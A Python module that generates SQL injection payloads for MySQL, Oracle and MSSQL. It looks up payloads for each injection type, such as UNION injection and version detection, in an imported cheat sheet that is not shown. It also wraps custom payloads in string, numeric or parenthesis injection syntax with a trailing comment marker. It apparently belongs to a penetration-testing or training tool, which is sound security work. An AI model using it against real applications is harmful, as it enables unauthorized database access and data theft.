"""
SQL Injection Payload Generator

Utility module for generating context-aware SQL injection payloads
based on the SQL syntax and error cheat sheet.
"""

from .sql_syntax_and_errors import SQL_CHEAT_SHEET, get_dbms_info, get_cheat_sheet_data


class SQLPayloadGenerator:
    """Generate SQL injection payloads based on DBMS and context"""
    
    CONTEXT_TYPES = ['string', 'numeric', 'parenthesis']
    
    def __init__(self, dbms='mysql'):
        """
        Initialize the payload generator
        
        Args:
            dbms: Database type (oracle, mysql, mssql)
        """
        self.dbms = dbms.lower()
        if self.dbms not in SQL_CHEAT_SHEET:
            raise ValueError(f"Unsupported DBMS: {dbms}. Supported: {list(SQL_CHEAT_SHEET.keys())}")
        
        self.dbms_info = get_dbms_info(self.dbms)
    
    def get_payload(self, injection_type, context='string'):
        """
        Generate a payload for a specific injection type and context
        
        Args:
            injection_type: Type of injection (e.g., 'version_detection', 'union_injection')
            context: Injection context ('string', 'numeric', 'parenthesis')
            
        Returns:
            dict: Payload information including the injection string and reference
        """
        if context not in self.CONTEXT_TYPES:
            raise ValueError(f"Invalid context: {context}. Must be one of {self.CONTEXT_TYPES}")
        
        cheat_data = get_cheat_sheet_data(self.dbms, injection_type)
        
        if not cheat_data:
            return None
        
        payloads = cheat_data.get('payloads', {})
        payload = payloads.get(context, '')
        
        return {
            'dbms': self.dbms_info.get('name', self.dbms),
            'injection_type': cheat_data.get('name', injection_type),
            'context': context,
            'payload': payload,
            'description': cheat_data.get('description', ''),
            'syntax_examples': cheat_data.get('syntax', []),
            'error_messages': cheat_data.get('errors', [])
        }
    
    def get_all_payloads(self, injection_type):
        """
        Get payloads for all contexts for a specific injection type
        
        Args:
            injection_type: Type of injection
            
        Returns:
            list: List of payload dictionaries for all contexts
        """
        payloads = []
        for context in self.CONTEXT_TYPES:
            payload_info = self.get_payload(injection_type, context)
            if payload_info:
                payloads.append(payload_info)
        return payloads
    
    def generate_custom_payload(self, base_payload, context='string'):
        """
        Wrap a custom payload in the appropriate context syntax
        
        Args:
            base_payload: The core payload string
            context: Injection context
            
        Returns:
            str: Context-wrapped payload
        """
        if context == 'string':
            return f"' {base_payload}--"
        elif context == 'numeric':
            return f" {base_payload}--"
        elif context == 'parenthesis':
            return f"') {base_payload}--"
        else:
            return base_payload
    
    def get_comment_syntax(self):
        """Get comment syntax for the current DBMS"""
        comment_data = get_cheat_sheet_data(self.dbms, 'comments')
        return comment_data.get('syntax', [])
    
    def get_available_injection_types(self):
        """Get list of available injection types for current DBMS"""
        return [key for key in self.dbms_info.keys() if key != 'name']


def generate_payloads(dbms, injection_type, context=None):
    """
    Convenience function to generate payloads
    
    Args:
        dbms: Database type
        injection_type: Type of injection
        context: Optional specific context, if None returns all contexts
        
    Returns:
        dict or list: Payload information
    """
    generator = SQLPayloadGenerator(dbms)
    
    if context:
        return generator.get_payload(injection_type, context)
    else:
        return generator.get_all_payloads(injection_type)


def get_cheat_sheet_reference(dbms, injection_type):
    """
    Get the cheat sheet reference for display
    
    Args:
        dbms: Database type
        injection_type: Type of injection
        
    Returns:
        dict: Cheat sheet reference data
    """
    return get_cheat_sheet_data(dbms, injection_type)


# Example usage
if __name__ == '__main__':
    # Example: Generate MySQL payloads
    print("=== MySQL Version Detection Payloads ===")
    generator = SQLPayloadGenerator('mysql')
    payloads = generator.get_all_payloads('version_detection')
    
    for payload in payloads:
        print(f"\nContext: {payload['context']}")
        print(f"Payload: {payload['payload']}")
        print(f"Description: {payload['description']}")
    
    # Example: Generate Oracle UNION injection
    print("\n\n=== Oracle UNION Injection ===")
    generator = SQLPayloadGenerator('oracle')
    payload = generator.get_payload('union_injection', 'string')
    print(f"Payload: {payload['payload']}")
    print(f"Syntax Examples: {payload['syntax_examples']}")
